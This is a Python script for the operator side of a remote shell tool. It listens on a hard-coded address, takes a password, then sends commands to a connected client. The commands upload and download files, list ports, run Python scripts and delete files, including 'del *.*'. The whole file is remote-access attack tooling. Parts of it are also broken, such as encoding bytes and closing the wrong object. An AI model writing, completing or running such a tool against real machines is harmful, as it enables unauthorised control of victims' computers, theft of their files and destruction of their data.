from socket import *
from colorama import Fore as c
from random import choice as ch
from subprocess import getoutput as out
from os import system as s
from time import sleep as sp

# ip = input("IP : ")
# print(out('netstat -an'))
# port = int(input("PORT : "))
ip = '192.168.42.118'
port = 5353
gr,rd,bl,cy,mg,yl = c.GREEN,c.RED,c.BLUE,c.CYAN,c.MAGENTA,c.YELLOW
lgr = c.LIGHTGREEN_EX
lrd = c.LIGHTRED_EX
lbl = c.LIGHTBLUE_EX
lcy = c.LIGHTCYAN_EX
lmg = c.LIGHTMAGENTA_EX
lyl = c.LIGHTYELLOW_EX
black = c.BLACK

colors = [gr,lgr,rd,lrd,bl,lbl,cy,lcy,mg,lmg,yl,lyl]

def s_file(conn):
    name = input("Enter File Name : ")
    conn.send(name.encode())
    f = open(name,'rb')
    read = f.read()
    conn.send(read.encode())
    f.close()

def r_file(conn):
    name = input("Enter File Name : ")
    conn.send(name.encode())
    file=conn.recv(123456789).decode()
    f = open(str(name),'wt')
    f.write(file)
    f.close()
def main():
    pass
    try:
        s = socket(AF_INET,SOCK_STREAM)
        s.bind((ip,port))
        s.listen(2)

        print("SERVER RUN "+'135')
        conn,addr = s.accept()
    except:
        print("SERVER NOT FOUND")
        sp(2)
    print("CLINET CONNECTED // ")
    tedad_p = 0
    password = input(f"{rd}PASSWORD{yl} :{bl} ")
    
    kea = ['help','port','recv','send','del /a ','del ','python ']
    
    if password == "Sinoce"  :
        while 1:
            cmd = input(f":Shell >> :")
            if cmd.lower() == 'exit' :
                exit()
            if cmd.lower() == 'port':
                conn.send(cmd.encode())
                print(conn.recv(123456789).decode())
            if cmd.lower().startswith('recv '):
                rcv = cmd.replace('recv ','')
                r_file(conn)
            if cmd.lower().startswith("send "):
                snd = cmd.replace('send ','')
                s_file(conn)
            if cmd == 'help':
                print(f"""{yl}Options{lyl}:\n {gr}cd {bl}directory\n {gr}cd .. {lcy}Back Directory\n {gr}recv {bl}File\n{gr} send {bl}File\n {gr}port {lcy}PortOpen\n{gr} python{bl} Run File Python\n {gr}del /a {bl}file {lcy}Delete File\n {gr}del {bl}*.* {lcy}delete all files dir\n {gr}help{lcy} Show Option""")
            if cmd.startswith('s '):
                command = cmd.replace("s ",'')
                conn.send(command)
            data = conn.send(cmd.encode())
            print(f"{conn.recv(123456789).decode()}")  
        c.close()
    else:
        if tedad_p == 3:
            print(f"{gr}30{bl} SECEND{rd} TRY AGAIN")
            sp(30)
        elif tedad_p == 6:
            print(f"{gr}1 {bl}Minute {rd}TRY AGAIN")
            sp(60)
        elif tedad_p == 9:
            print(f'{gr}5 {bl}Minte{rd} TRY AGAIN')
            sp(5*60)
        elif tedad_p == 10:
            print(f"{gr}ONE {bl}DAY{rd} TRY AGAIN")
            exit()
        tedad_p +=1
        print(f"{rd}PASSWORD{mg} INCORRECT ")
        pass
main()